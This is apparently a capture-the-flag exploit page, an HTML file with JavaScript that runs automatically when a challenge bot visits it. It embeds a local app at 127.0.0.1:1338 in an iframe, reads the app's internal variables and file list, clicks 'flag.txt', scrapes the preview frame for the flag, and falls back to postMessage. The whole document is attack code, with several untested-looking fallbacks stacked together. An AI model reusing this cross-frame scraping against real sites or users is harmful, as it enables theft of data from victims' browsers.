<!DOCTYPE html>
<html>
<head>
    <title>Flag Extractor - Working Version</title>
</head>
<body>
    <h1>Flag Extractor</h1>
    <div id="result">Waiting for flag...</div>
    <button onclick="triggerExploit()">Click to Extract Flag</button>
    
    <script>
        function log(msg) {
            console.log(msg);
            document.getElementById('result').innerHTML += `<p>${msg}</p>`;
        }
        
        // The bot visits this page AFTER adding the flag
        // So we need to access the main app from here
        function triggerExploit() {
            log('Starting exploit...');
            
            // Since window.open is blocked, use a different approach
            // Create an iframe to the main application
            const iframe = document.createElement('iframe');
            iframe.src = 'http://127.0.0.1:1338';
            iframe.style.width = '100%';
            iframe.style.height = '600px';
            iframe.style.border = '2px solid red';
            document.body.appendChild(iframe);
            
            iframe.onload = () => {
                log('Main app loaded in iframe');
                
                try {
                    // Try to access the mathRandomInvocations array
                    const saltArray = iframe.contentWindow.mathRandomInvocations;
                    if (saltArray && saltArray.length > 0) {
                        const flagSalt = saltArray[saltArray.length - 1];
                        log(`Found flag salt: ${flagSalt}`);
                        
                        // Now extract the flag using this salt
                        extractFlagWithSalt(flagSalt, iframe.contentWindow);
                    } else {
                        log('Could not access mathRandomInvocations array');
                        
                        // Alternative: try to access the file list directly
                        const filesList = iframe.contentWindow.document.querySelector('#filesList');
                        if (filesList) {
                            const flagFile = Array.from(filesList.children).find(
                                el => el.dataset.name === 'flag.txt'
                            );
                            if (flagFile) {
                                log('Found flag file element, clicking it...');
                                flagFile.click();
                                
                                // Wait for the flag to load and extract it
                                setTimeout(() => {
                                    const previewIframe = iframe.contentWindow.document.querySelector('#previewIframe');
                                    if (previewIframe && previewIframe.contentDocument) {
                                        const flagContent = previewIframe.contentDocument.body.innerText;
                                        if (flagContent.includes('CTF{')) {
                                            log(`ðŸš© FLAG FOUND: ${flagContent}`);
                                            document.getElementById('result').innerHTML = 
                                                `<h2 style="color: green;">FLAG: ${flagContent}</h2>`;
                                        }
                                    }
                                }, 2000);
                            }
                        }
                    }
                } catch (error) {
                    log(`Error accessing iframe content: ${error.message}`);
                    
                    // Last resort: try postMessage communication
                    iframe.contentWindow.postMessage({
                        type: 'requestFlag'
                    }, '*');
                }
            };
        }
        
        function extractFlagWithSalt(salt, mainWindow) {
            log(`Extracting flag with salt: ${salt}`);
            
            // Use the salt to access the flag file directly
            try {
                // Look for the flag file in the file list
                const filesList = mainWindow.document.querySelector('#filesList');
                const flagFile = Array.from(filesList.children).find(
                    el => el.dataset.name === 'flag.txt'
                );
                
                if (flagFile) {
                    log('Clicking flag file...');
                    flagFile.click();
                    
                    // Monitor for the flag content
                    const checkForFlag = setInterval(() => {
                        const previewIframe = mainWindow.document.querySelector('#previewIframe');
                        if (previewIframe && previewIframe.contentDocument) {
                            const content = previewIframe.contentDocument.body.innerText;
                            if (content && content.includes('CTF{')) {
                                log(`ðŸš© FLAG FOUND: ${content}`);
                                document.getElementById('result').innerHTML = 
                                    `<h2 style="color: green;">FLAG: ${content}</h2>`;
                                clearInterval(checkForFlag);
                            }
                        }
                    }, 500);
                    
                    // Stop checking after 10 seconds
                    setTimeout(() => clearInterval(checkForFlag), 10000);
                }
            } catch (error) {
                log(`Error extracting flag: ${error.message}`);
            }
        }
        
        // Listen for messages that might contain the flag
        window.addEventListener('message', (event) => {
            log(`Received message: ${JSON.stringify(event.data)}`);
            
            if (event.data && typeof event.data === 'string' && event.data.includes('CTF{')) {
                log(`ðŸš© FLAG FOUND in message: ${event.data}`);
                document.getElementById('result').innerHTML = 
                    `<h2 style="color: green;">FLAG: ${event.data}</h2>`;
            }
        });
        
        // Auto-trigger the exploit after a short delay
        setTimeout(() => {
            log('Auto-triggering exploit...');
            triggerExploit();
        }, 1000);
    </script>
</body>
</html>
